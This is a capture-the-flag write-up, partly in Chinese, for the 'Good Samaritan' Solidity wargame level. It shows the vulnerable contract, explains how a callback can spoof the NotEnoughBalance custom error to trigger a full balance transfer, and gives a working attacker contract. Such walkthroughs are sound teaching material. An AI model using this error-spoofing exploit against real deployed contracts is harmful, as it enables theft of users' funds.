# Good Samaritan

> This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it.
>
> Would you be able to drain all the balance from his Wallet?
>
> Things that might help:
>
> - [Solidity Custom Errors](https://blog.soliditylang.org/2021/04/21/custom-errors/)

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) {
                // notify contract 
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

## 攻击思路

题目说我们要掏空`Wallet`中的`Coin`

1. 重入攻击

   合约中的`requestDonation`函数没有检查重入攻击，一次请求10个，一共10**6个。怕是要花不少Gas。

2. 当`Wallet`合约中`Coin`余额不足10时，会触发`transferRemainder`将剩余所有`Coin`转移给请求者。

   而触发`transferRemainder`的条件是`GoodSamaritan`合约检测到`NotEnoughBalance()`错误。

   但`GoodSamaritan`合约却无法知道这个`NotEnoughBalance()`错误是谁发出的。

   所以我们可以写攻击合约发出`NotEnoughBalance()`错误让`GoodSamaritan`合约将`Wallet`合约中的所有`Coin`转给我们。



## 攻击流程

增加`onlyOwner`使防止链上的夹子机器人抢跑我们的交易。

```solidity
contract Attack {

    address  owner;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {//防止夹子机器人
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function notify(uint256 amount) pure public {

        if(amount == 10){
            revert NotEnoughBalance();
        }
    }

    function attack(GoodSamaritan goodSamaritan) external onlyOwner{
        goodSamaritan.requestDonation();
        Coin coin = Coin(goodSamaritan.coin());
        withdraw(coin, owner);
    }

    function withdraw(Coin coin, address dest_) internal onlyOwner{
        coin.transfer(dest_, coin.balances(address(this)));
    }
}
```



Congratulations! You have completed the level. Have a look at the Solidity code for the contract you just interacted with below.

Godspeed!!